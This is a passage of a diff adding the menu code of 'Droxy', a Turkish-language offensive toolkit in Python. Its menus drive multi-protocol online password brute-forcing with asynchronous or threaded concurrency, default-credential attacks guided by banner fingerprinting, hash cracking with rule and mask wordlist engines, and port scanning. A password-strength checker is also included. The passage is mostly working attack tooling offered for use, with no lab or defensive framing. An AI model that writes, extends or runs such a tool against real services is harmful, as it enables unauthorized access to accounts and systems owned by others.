+    print(f"{CYAN}[i] Kategori: {fp['aciklama']}{RESET}")
+    if fp["kimlikler"]:
+        print(f"{SARI}[i] Önerilen varsayılan kimlikler:{RESET}")
+        for u,p in fp["kimlikler"][:8]: print(f"    {SOLUK}{u}:{p}{RESET}")
+        if input(f"{SARI}Önerilerle saldır? (e/h): {RESET}").strip().lower()=="e":
+            ek={"ilk_hitte_dur":True}
+            if sv["motor"]=="http_basic": ek.update(scheme="http",path="/")
+            if sv["motor"]=="http_post":
+                ek["scheme"]="http"
+                ek["form_tanim"]=input(f"{BEYAZ}[?] Form tanımı: {RESET}").strip()
+            Santral(sec,hedef,port,[u for u,p in fp["kimlikler"] if u],
+                    [p for u,p in fp["kimlikler"] if p],64,5,True,ek).calistir()
+            bekle(); return
+
+    users,passes=kimlik_kaynak()
+    if not users or not passes:
+        print(f"{KIRMIZI}[!] Liste boş.{RESET}"); bekle(); return
+
+    ek={"ilk_hitte_dur":True}
+    if sv["motor"]=="http_basic":
+        ek["scheme"]=input(f"{BEYAZ}[?] Şema [http]: {RESET}").strip() or "http"
+        ek["path"]=input(f"{BEYAZ}[?] Yol [/]: {RESET}").strip() or "/"
+    if sv["motor"]=="http_post":
+        ek["scheme"]=input(f"{BEYAZ}[?] Şema [http]: {RESET}").strip() or "http"
+        print(f"{CYAN}Format: /login.php:user=^USER^&pass=^PASS^:F=hata{RESET}")
+        ek["form_tanim"]=input(f"{BEYAZ}[?] Form: {RESET}").strip()
+
+    mod=input(f"{SARI}Mod [1=async/2=sync] [1]: {RESET}").strip() or "1"
+    if mod=="1":
+        c=input(f"{BEYAZ}[?] Concurrency [64]: {RESET}").strip() or "64"
+        Santral(sec,hedef,port,users,passes,int(c),5,True,ek).calistir()
+    else:
+        t=input(f"{BEYAZ}[?] Thread [16]: {RESET}").strip() or "16"
+        Santral(sec,hedef,port,users,passes,int(t),5,False,ek).calistir()
+    bekle()
+
+def menu_hash():
+    temizle(); banner(); baslik("HASH KIRMA MOTORU")
+    h=input(f"{BEYAZ}[?] Hash: {RESET}").strip()
+    if not h: bekle(); return
+    alg=HashMotoru.tespit(h)
+    print(f"{CYAN}[i] Algılanan: {alg}{RESET}")
+    for n,(a,_) in HashMotoru.ALGOLAR.items(): print(f"  [{n}] {a}")
+    sec=input(f"{SARI}Algoritma: {RESET}").strip()
+    if sec not in HashMotoru.ALGOLAR: bekle(); return
+    al=HashMotoru.ALGOLAR[sec][1]
+
+    print(f"{BEYAZ}[1]Droxy üret [2]Dosya [3]Rule [4]Mask{RESET}")
+    ws=input(f"{SARI}Wordlist: {RESET}").strip()
+    if ws=="1":
+        kat=input(f"{BEYAZ}[?] Katman[2]: {RESET}") or "2"
+        wl=list(WordlistMotoru.uret(kat))
+    elif ws=="2":
+        wl=WordlistMotoru.dosyadan_oku(input(f"{BEYAZ}[?] Yol: {RESET}").strip())
+    elif ws=="3":
+        b=WordlistMotoru.dosyadan_oku(input(f"{BEYAZ}[?] Base list: {RESET}").strip())
+        ry=input(f"{BEYAZ}[?] Kural dosyası (boş=dahili): {RESET}").strip()
+        if not ry:
+            ry=os.path.join(CFG.RULE_DIR,"droxy_best64.rule")
+            RuleEngine.ornek_uret(ry)
+        re=RuleEngine(); re.dosya_yukle(ry)
+        wl=[]
+        for w in b: wl.append(w); wl.extend(re.uygula(w))
+        wl=list(dict.fromkeys(wl))
+    elif ws=="4":
+        m=input(f"{BEYAZ}[?] Maske: {RESET}").strip()
+        wl=list(MaskEngine.uret(m))
+    else: bekle(); return
+
+    if not wl: print(f"{KIRMIZI}[!] Liste boş.{RESET}"); bekle(); return
+    print(f"\n{MOR}[*] {len(wl)} aday kırılıyor ({al.upper()})...{RESET}")
+    bulunan,deneme,sure=HashMotoru.kir(h,al,wl)
+    if bulunan:
+        print(f"\n{YESIL}{KALIN}[+] KIRILDI! Parola: {bulunan}{RESET}")
+        log_yaz(f"HASH | {al} | {bulunan}")
+    else:
+        print(f"\n{KIRMIZI}[-] Bulunamadı.{RESET}")
+    print(f"{CYAN}[i] {deneme} deneme, {sure:.2f}sn, {deneme/sure:.0f}/sn{RESET}")
+    bekle()
+
+def menu_mask():
+    temizle(); banner(); baslik("MASK ATTACK ÜRETİCİ")
+    m=input(f"{BEYAZ}[?] Maske (örn ?u?l?l?l?d?d?d): {RESET}").strip()
+    if not m: bekle(); return
+    print(f"{CYAN}[i] Tahmini kombinasyon: {MaskEngine.tahmini_sayi(m):,}{RESET}")
+    yol=os.path.join(CFG.WL_DIR,"mask_output.txt")
+    t=0
+    with open(yol,"w",encoding="utf-8") as f:
+        for k in MaskEngine.uret(m):
+            f.write(k+"\n"); t+=1
+            if t>=5_000_000:
+                print(f"{SARI}[!] 5M limit — kesildi.{RESET}"); break
+    print(f"{YESIL}[+] {t} kelime: {yol}{RESET}")
+    bekle()
+
+def menu_rule():
+    temizle(); banner(); baslik("KURAL MOTORU")
+    b=WordlistMotoru.dosyadan_oku(input(f"{BEYAZ}[?] Base wordlist: {RESET}").strip())
+    ry=input(f"{BEYAZ}[?] Kural dosyası (boş=dahili): {RESET}").strip()
+    if not ry:
+        ry=os.path.join(CFG.RULE_DIR,"droxy_best64.rule")
+        RuleEngine.ornek_uret(ry); print(f"{YESIL}[+] Dahili üretildi{RESET}")
+    re=RuleEngine(); re.dosya_yukle(ry)
+    yol=os.path.join(CFG.SONUC_DIR,"kombine.txt"); t=0; g=set()
+    with open(yol,"w",encoding="utf-8") as f:
+        for w in b:
+            for a in [w]+list(re.uygula(w)):
+                if a and a not in g:
+                    g.add(a); f.write(a+"\n"); t+=1
+    print(f"{YESIL}[+] {t} kelime: {yol}{RESET}")
+    bekle()
+
+def menu_fp():
+    temizle(); banner(); baslik("FINGERPRINT")
+    h=input(f"{BEYAZ}[?] Hedef IP: {RESET}").strip()
+    if not h: bekle(); return
+    ps=input(f"{BEYAZ}[?] Port [22]: {RESET}").strip() or "22"
+    fp=Fingerprint.oneri(h,int(ps))
+    print(f"\n{CYAN}Banner : {fp['banner'] or '(alınadı)'}{RESET}")
+    print(f"{CYAN}Kategori: {fp['aciklama']}{RESET}")
+    for u,p in fp["kimlikler"]: print(f"  {SOLUK}{u:<16}:{p}{RESET}")
+    bekle()
+
+def menu_wordlist():
+    temizle(); banner(); baslik("WORDLIST ÜRETİCİ")
+    kat=input(f"{SARI}Katman(1-3): {RESET}").strip()
+    if kat not in ("1","2","3"): bekle(); return
+    yol=os.path.join(CFG.WL_DIR,f"droxy5_katman{kat}.txt")
+    t=WordlistMotoru.dosyaya_yaz(kat,yol)
+    print(f"{YESIL}[+] {t} kelime: {yol}{RESET}")
+    bekle()
+
+def menu_tarama():
+    temizle(); banner(); baslik("SERVİS TARAMASI")
+    h=input(f"{BEYAZ}[?] Hedef IP: {RESET}").strip()
+    if not h: bekle(); return
+    print()
+    for p in [21,22,23,25,80,443,445,3306,3389,5432,6379,8080]:
+        try:
+            s=socket.socket(); s.settimeout(1.0)
+            if s.connect_ex((h,p))==0:
+                ad=next((v["ad"] for v in SERVISLER.values()
+                         if v["port"]==p),"?")
+                print(f"  {YESIL}[+]{RESET} {p:<6} AÇIK → {ad}")
+            s.close()
+        except Exception: pass
+    bekle()
+
+def menu_analiz():
+    temizle(); banner(); baslik("PAROLA GÜÇ ANALİZİ")
+    pw=input(f"{BEYAZ}[?] Parola: {RESET}")
+    if not pw: bekle(); return
+    puan=0; n=[]
+    U=len(pw)
+    if U>=8: puan+=1
+    else: n.append("En az 8 karakter")
+    if U>=12: puan+=1
+    if U>=16: puan+=1
+    if any(c.islower() for c in pw): puan+=1
+    else: n.append("Küçük harf")
+    if any(c.isupper() for c in pw): puan+=1
+    else: n.append("Büyük harf")
+    if any(c.isdigit() for c in pw): puan+=1
+    else: n.append("Rakam")
+    if any(not c.isalnum() for c in pw): puan+=1
+    else: n.append("Sembol")
+    if pw.lower() in [w.lower() for w in WordlistMotoru.BASE_WORDS]:
+        n.append("SÖZLÜK PAROLASI!"); puan=max(0,puan-2)
+    sev=(f"{KIRMIZI}{KALIN}ZAYIF{RESET}" if puan<=3 else
+         f"{SARI}{KALIN}ORTA{RESET}" if puan<=5 else f"{YESIL}{KALIN}GÜÇLÜ{RESET}")
+    print(f"\nSeviye: {sev}  Puan: {puan}/7  Uzunluk: {U}")
+    for x in n: print(f"  • {x}")
+    bekle()
+
+def menu_rapor():
+    temizle(); banner(); baslik("SONUÇ RAPORLARI")
+    if not os.path.isdir(CFG.SONUC_DIR): bekle(); return
+    d=sorted([f for f in os.listdir(CFG.SONUC_DIR) if f.endswith(".txt")],reverse=True)
+    if not d: print(f"{SARI}[i] Rapor yok.{RESET}"); bekle(); return
+    for i,x in enumerate(d[:20],1): print(f"  [{i}] {x}")
+    sec=input(f"\n{SARI}No: {RESET}").strip()
+    if sec.isdigit() and 1<=int(sec)<=len(d[:20]):
+        yol=os.path.join(CFG.SONUC_DIR,d[int(sec)-1])
+        print(f"\n{MAVI}{'─'*60}{RESET}")
+        try:
+            with open(yol,encoding="utf-8") as f: print(f.read())
+        except OSError as e: print(f"{KIRMIZI}{e}{RESET}")
+        print(f"{MAVI}{'─'*60}{RESET}")
+    bekle()
+
+def menu_dongusu():
+    while True:
+        temizle(); banner()
+        print(f"{MOR}{'='*18} DROXY v{CFG.VERSION} SÜRÜM {CFG.SURUM} {'='*18}{RESET}\n")
+        print(f"{BEYAZ}[1] Saldırı santrali (async/sync, 9 protokol, fingerprint){RESET}")
+        print(f"{BEYAZ}[2] Hash kırma (çoklu-process + mask + rule){RESET}")
+        print(f"{BEYAZ}[3] Kural motoru (best64 uyumlu){RESET}")
+        print(f"{BEYAZ}[4] Mask attack üretici{RESET}")
+        print(f"{BEYAZ}[5] Banner fingerprint & varsayılan kimlik DB{RESET}")
+        print(f"{BEYAZ}[6] Wordlist üretici{RESET}")
+        print(f"{BEYAZ}[7] Servis taraması{RESET}")
+        print(f"{BEYAZ}[8] Parola güç analizi{RESET}")
+        print(f"{BEYAZ}[9] Sonuç raporları{RESET}")
+        print(f"{KIRMIZI}[0] Çıkış{RESET}")
+        sec=input(f"\n{SARI}Droxy > Seçim: {RESET}").strip()
+        aksiyon={"1":menu_saldiri,"2":menu_hash,"3":menu_rule,"4":menu_mask,
+                 "5":menu_fp,"6":menu_wordlist,"7":menu_tarama,
+                 "8":menu_analiz,"9":menu_rapor}
+        if sec=="0":
+            print(f"\n{KIRMIZI}[*] Kapatılıyor.{RESET}"); sys.exit(0)
+        elif sec in aksiyon: aksiyon[sec]()
+        else:
+            print(f"{KIRMIZI}[!] Geçersiz.{RESET}"); time.sleep(1)
+
+if __name__=="__main__":
+    CFG.hazirla()
+    import warnings; warnings.filterwarnings("ignore")
+    try: menu_dongusu()
+    except KeyboardInterrupt:
+        print(f"\n{KIRMIZI}[-] Durduruldu.{RESET}"); sys.exit(0)
+    except Exception as e:
+        print(f"\n{KIRMIZI}[!] Hata: {e}{RESET}"); traceback.print_exc(); sys.exit(1)
